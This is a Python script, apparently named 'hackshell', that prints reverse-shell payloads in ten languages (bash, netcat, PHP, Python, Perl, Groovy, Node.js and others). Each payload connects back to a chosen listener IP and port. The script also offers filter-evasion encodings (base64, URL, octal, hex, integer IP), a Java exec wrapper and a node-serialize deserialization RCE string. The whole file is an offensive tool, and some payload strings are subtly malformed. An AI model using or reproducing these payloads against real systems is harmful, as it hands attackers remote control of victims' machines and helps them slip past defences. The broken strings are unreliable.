#!/usr/bin/python3

from argparse import RawTextHelpFormatter
import urllib.parse, base64, struct, socket, argparse

def menu():
    return (""".------..------..------..------..------..------..------..------..------.
|H.--. ||A.--. ||C.--. ||K.--. ||S.--. ||H.--. ||E.--. ||L.--. ||L.--. |
| :/\: || (\/) || :/\: || :/\: || :/\: || :/\: || (\/) || :/\: || :/\: |
| (__) || :\/: || :\/: || :\/: || :\/: || (__) || :\/: || (__) || (__) |
| '--'H|| '--'A|| '--'C|| '--'K|| '--'S|| '--'H|| '--'E|| '--'L|| '--'L|
`------'`------'`------'`------'`------'`------'`------'`------'`------'
""")

def Encodeb64(payload):
    message_bytes = payload.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    base64_message = base64_bytes.decode('ascii')
    return base64_message

def ReverseShellBash(ip, port, type):
    payload = ''.join(("ba$()sh -$()i '/dev/tcp/"+ip+"/"+port," 0>&1'"))
    base64_message = Encodeb64(payload)

    if type == 'd':
        print(payload)
    elif type == 'b64':
        print(base64_message)
    elif type == 'urle':
        urltype = urllib.parse.quote(payload)
        print(urltype)
    elif type == 'long':
        ip2 = struct.unpack("!I", socket.inet_aton(ip))[0]
        rsba2 = ''.join(("ba$()sh -$()i >& /dev/tcp/"+str(ip2)+"/"+port," 0>&1"))
        print(rsba2)
    elif type == 'octa':
        ip2 = '.'.join(format(int(x), '04o') for x in ip.split('.'))
        rsba2 = ''.join(("ba$()sh -$()i >& /dev/tcp/"+str(ip2)+"/"+port," 0>&1"))
        print(rsba2)
    elif type == 'hex':
        ip2='0x{:02X}{:02X}{:02X}{:02X}'.format(*map(int, ip.split('.')))
        rsba2 = ''.join(("ba$()sh -$()i >& /dev/tcp/"+str(ip2)+"/"+port," 0>&1"))
        print(rsba2)
    elif type == "jlre":
        print ("bash -c {echo,"+base64_message+"}|{base64,-d}|{bash,-i}")

def ReverseShellzsh(ip, port, type):
    payload = ''.join(("zsh -c 'zmodload zsh/net/tcp && ztcp"+ip,port+"&& zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"))
    base64_message = Encodeb64(payload)

    if type == 'd':
        print(payload)
    elif type == 'b64':
        print(base64_message)
    elif type == 'urle':
        urltype = urllib.parse.quote(payload)
        print(urltype)
    elif type == 'long':
        ip2 = struct.unpack("!I", socket.inet_aton(ip))[0]
        rsz2 = ''.join(("zsh -c 'zmodload zsh/net/tcp && ztcp"+str(ip2),port+"&& zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"))
        print(rsz2)
    elif type == 'octa':
        ip2 = '.'.join(format(int(x), '04o') for x in ip.split('.'))
        rsz2 = ''.join(("zsh -c 'zmodload zsh/net/tcp && ztcp"+str(ip2),port+"&& zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"))
        print(rsz2)
    elif type == 'hex':
        ip2='0x{:02X}{:02X}{:02X}{:02X}'.format(*map(int, ip.split('.')))
        rsz2 = ''.join(("zsh -c 'zmodload zsh/net/tcp && ztcp"+str(ip2),port+"&& zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"))
        print(rsz2)
    elif type == "jlre":
        print ("bash -c {echo,"+base64_message+"}|{base64,-d}|{bash,-i}")

def ReverseShellNetcat(ip, port, type):
    payload = ''.join(("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|n$()c "+ip+" "+port, " >/tmp/f"))
    base64_message = Encodeb64(payload)

    if type == 'd':
        print(payload)
    elif type == 'b64':
        print(base64_message)
    elif type =='urle':
        urltype = urllib.parse.quote(payload)
        print(urltype)
    elif type == 'octa':
        ip2 = '.'.join(format(int(x), '04o') for x in ip.split('.'))
        rsnc2 = ''.join(("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|n$()c "+str(ip2),port, " >/tmp/f"))
        print(rsnc2)
    elif type == 'hex':
        ip2='0x{:02X}{:02X}{:02X}{:02X}'.format(*map(int, ip.split('.')))
        rsnc2 = ''.join(("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|n$()c "+str(ip2),port," >/tmp/f"))
        print(rsnc2)
    elif type == 'jlre':
        print ("bash -c {echo,"+base64_message+"}|{base64,-d}|{bash,-i}")

def ReverseShellPhp(ip, port,type):
    payload = ''.join(("ph$()p -$()r '$sock=fsockopen("+"\""+ ip +"\"" +","+port+');exec("/bin/sh -i <&3 >&3 2>&3");\''))
    base64_message = Encodeb64(payload)

    if type == 'd':
        print(payload)
    elif type == 'b64':
        print(base64_message)
    elif type =='urle':
        urltype = urllib.parse.quote(payload)
        print(urltype)
    elif type == 'long':
        ip2 = struct.unpack("!I", socket.inet_aton(ip))[0]
        rsph2 = ''.join(("ph$()p -$()r '$sock=fsockopen(""\""+ str(ip2) +"\"" +","+port,');exec("/bin/sh -i <&3 >&3 2>&3");\''))
        print(rsph2)
    elif type == 'octa':
        ip2 = '.'.join(format(int(x), '04o') for x in ip.split('.'))
        rsph2 = ''.join(("ph$()p -$()r '$sock=fsockopen(""\""+ str(ip2) +"\"" +","+port,');exec("/bin/sh -i <&3 >&3 2>&3");\''))
        print(rsph2)
    elif type == 'hex':
        ip2='0x{:02X}{:02X}{:02X}{:02X}'.format(*map(int, ip.split('.')))
        rsph2 = ''.join(("ph$()p -$()r '$sock=fsockopen(""\""+ str(ip2) +"\"" +","+port,');exec("/bin/sh -i <&3 >&3 2>&3");\''))
        print(rsph2)
    elif type == "jlre":
        print ("bash -c {echo,"+base64_message+"}|{base64,-d}|{bash,-i}")

def ReverseShellPython(ip, port,type):
    payload = ''.join(("py$()thon -$()c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""+ip+"\","+port+"));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'"))
    base64_message = Encodeb64(payload)
    
    if type == 'd':
        print(payload)
    elif type == 'b64':
        print(base64_message)
    elif type == 'urle':
        urltype = urllib.parse.quote(payload)
        print(urltype)
    elif type == 'long':
        ip2 = struct.unpack("!I", socket.inet_aton(ip))[0]
        rspy2 = ''.join(("py$()thon -$()c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""+str(ip2)+"\","+port+"));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'"))
        print(rspy2)
    elif type == 'octa':
        ip2 = '.'.join(format(int(x), '04o') for x in ip.split('.'))
        rspy2 = ''.join(("py$()thon -$()c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""+str(ip2)+"\","+port+"));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'"))
        print(rspy2)
    elif type == 'hex':
        ip2='0x{:02X}{:02X}{:02X}{:02X}'.format(*map(int, ip.split('.')))
        rspy2 = ''.join(("py$()thon -$()c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""+str(ip2)+"\","+port+"));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'"))
        print(rspy2)
    elif type == "jlre":
        print ("bash -c {echo,"+base64_message+"}|{base64,-d}|{bash,-i}")

def ReverseShellPerl(ip, port,type):
    payload = ''.join(("pe$()rl -$()e 'use Socket;$i=\""+ip+"\";$p="+port+";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"))
    base64_message = Encodeb64(payload)

    if type == "d":
        print(payload)
    elif type == 'b64':
        print(base64_message)
    elif type =='urle':
        urltype = urllib.parse.quote(payload)
        print(urltype)
    elif type == 'long':
        ip2 = struct.unpack("!I", socket.inet_aton(ip))[0]
        rspe2 = ''.join(("pe$()rl -$()e 'use Socket;$i=\""+str(ip2)+"\";$p="+port+";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"))
        print(rspe2)
    elif type == 'octa':
        ip2 = '.'.join(format(int(x), '04o') for x in ip.split('.'))
        rspe2 = ''.join(("pe$()rl -$()e 'use Socket;$i=\""+ str(ip2)+"\";$p="+port+";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"))
        print(rspe2)
    elif type == 'hex':
        ip2='0x{:02X}{:02X}{:02X}{:02X}'.format(*map(int, ip.split('.')))
        rspe2 = ''.join(("pe$()rl -$()e 'use Socket;$i=\""+ str(ip2)+"\";$p="+port+";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"))
        print(rspe2)
    elif type == 'jlre':
        print ("bash -c {echo,"+base64_message+"}|{base64,-d}|{bash,-i}")

def ReverseShellRuby(ip, port, type):
    payload = ''.join(("ru$()by -rsocket -$()e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\""+ip+"\","+port+"))'"))
    base64_message = Encodeb64(payload)

    if type == "d":
        print(payload)
    elif type == 'b64':
        print(base64_message)
    elif type == 'urle':
        urltype = urllib.parse.quote(payload)
        print(urltype)
        
    elif type == 'long':
        ip2 = struct.unpack("!I", socket.inet_aton(ip))[0]
        rsr2 = ''.join(("ru$()by -rsocket -$()e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\""+str(ip2)+"\","+port+"))'"))
        print(rsr2)
    elif type == 'octa':
        ip2 = '.'.join(format(int(x), '04o') for x in ip.split('.'))
        rsr2 = ''.join(("ru$()by -rsocket -$()e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\""+str(ip2)+"\","+port+"))'"))
        print(rsr2)
    elif type == 'hex':
        ip2='0x{:02X}{:02X}{:02X}{:02X}'.format(*map(int, ip.split('.')))
        rsr2 = ''.join(("r$()by -rsocket -$()e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\""+str(ip2)+"\","+port+"))'"))
        print(rsr2)
    elif type == 'jlre':
        print ("bash -c {echo,"+base64_message+"}|{base64,-d}|{bash,-i}")

def ReverseShellLua(ip, port, type):
    payload = ''.join(("lua -e \"require('socket');require('os');t=socket.tcp();t:connect('\""+ip+"\"','"+port+"');os.execute('sh -i <&3 >&3 2>&3');\""))
    base64_message = Encodeb64(payload)

    if type == "d":
        print(payload)
    elif type == 'b64':
        print(base64_message)
    elif type == 'urle':
        urltype = urllib.parse.quote(payload)
        print(urltype)

    elif type == 'long':
        ip2 = struct.unpack("!I", socket.inet_aton(ip))[0]
        rsl2 = ''.join(("lua -e \"require('socket');require('os');t=socket.tcp();t:connect('\""+str(ip2)+"\",'"+port+"');os.execute('sh -i <&3 >&3 2>&3');\""))
        print(rsl2)
    elif type == 'octa':
        ip2 = '.'.join(format(int(x), '04o') for x in ip.split('.'))
        rsl2 = ''.join(("lua -e \"require('socket');require('os');t=socket.tcp();t:connect('\""+str(ip2)+"\",'"+port+"');os.execute('sh -i <&3 >&3 2>&3');\""))
        print(rsl2)
    elif type == 'hex':
        ip2='0x{:02X}{:02X}{:02X}{:02X}'.format(*map(int, ip.split('.')))
        rsl2 = ''.join(("lua -e \"require('socket');require('os');t=socket.tcp();t:connect('\""+str(ip2)+"\",'"+port+"');os.execute('sh -i <&3 >&3 2>&3');\""))
        print(rsl2)
    elif type == 'jlre':
        print("bash -c {echo,"+base64_message+"}|{base64,-d}|{bash,-i}")

def ReverseShellGroovy(ip, port, type):
    payload = ''.join(("""r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/"""+ip+"""/"""+port+""";cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()"""))
    base64_message = Encodeb64(payload)

    if type == "d":
        print(payload)
    elif type == 'b64':
        print(base64_message)
    elif type == 'urle':
        urltype = urllib.parse.quote(payload)
        print(urltype)
    elif type == 'long':
        ip2 = struct.unpack("!I", socket.inet_aton(ip))[0]
        rsg2 = ''.join(("""r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/"""+str(ip2)+"""/"""+port+""";cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()"""))
        print(rsg2)
    elif type == 'octa':
        ip2 = '.'.join(format(int(x), '04o') for x in ip.split('.'))
        rsg2 = ''.join(("""r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/"""+str(ip2)+"""/"""+port+""";cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()"""))
        print(rsg2)
    elif type == 'hex':
        ip2='0x{:02X}{:02X}{:02X}{:02X}'.format(*map(int, ip.split('.')))
        rsg2 = ''.join((""""r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/"""+str(ip2)+"""/"""+port+""";cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()"""))
        print(rsg2)
    elif type == 'jlre':
        print("bash -c {echo,"+base64_message+"}|{base64,-d}|{bash,-i}")

def ReverseShellnodejs(ip, port, type):
    if type == "d":
        print("require('child_process').exec('nc -e sh",ip,port+"')")
    elif type == "func":
        print("{\"rce\":\"_$$ND_FUNC$$_function(){require(\\\"child_process\\\").execSync(\\\"/bin/b$()ash -c '/bin/sh -i >& /dev/tcp/"+ip+"/"+port,"0>&1\'\\\")}()\"}")

parser = argparse.ArgumentParser(description=menu(), formatter_class=RawTextHelpFormatter, usage="python hackshell.py --payload bash --lhost 192.168.0.20 --lport 443 --type hex")
parser.add_argument('--payload', dest='payload', action='store', type=str, help='bash,zsh,nc,php,python,perl,ruby,lua,groovy,nodejs,all', required=True)
parser.add_argument('--lhost', dest='lhost', action='store', type=str, help='ip')
parser.add_argument('--lport', dest='lport', action='store', type=str, help='port')
parser.add_argument('--type', dest='type', action='store', type=str, help="b64,urle,int,octa,hex,jlre,func")
args=parser.parse_args()
if not args.type:
    args.type = "d"
if  args.payload == "bash":
    ReverseShellBash(args.lhost,args.lport, args.type)
elif args.payload == "zsh":
    ReverseShellzsh(args.lhost, args.lport, args.type)
elif args.payload == "nc":
    ReverseShellNetcat(args.lhost, args.lport, args.type)
elif args.payload == "php" :
    ReverseShellPhp(args.lhost, args.lport, args.type)
elif args.payload == "python":
    ReverseShellPython(args.lhost, args.lport, args.type)
elif args.payload == "perl":
    ReverseShellPerl(args.lhost, args.lport, args.type)
elif args.payload == "ruby":
    ReverseShellRuby(args.lhost, args.lport, args.type)
elif args.payload == "lua":
    ReverseShellLua(args.lhost, args.lport, args.type)
elif args.payload == "groovy":
    ReverseShellGroovy(args.lhost, args.lport, args.type)
elif args.payload == "nodejs":
    ReverseShellnodejs(args.lhost, args.lport, args.type)
elif args.payload == "all":
    ReverseShellBash(args.lhost, args.lport, args.type)
    ReverseShellzsh(args.lhost, args.lport, args.type)
    ReverseShellNetcat(args.lhost, args.lport, args.type)
    ReverseShellPython(args.lhost, args.lport, args.type)
    ReverseShellPerl(args.lhost, args.lport, args.type)
    ReverseShellRuby(args.lhost, args.lport, args.type)
    ReverseShellLua(args.lhost, args.lport, args.type)
    ReverseShellGroovy(args.lhost, args.lport, args.type)
    ReverseShellnodejs(args.lhost, args.lport, args.type)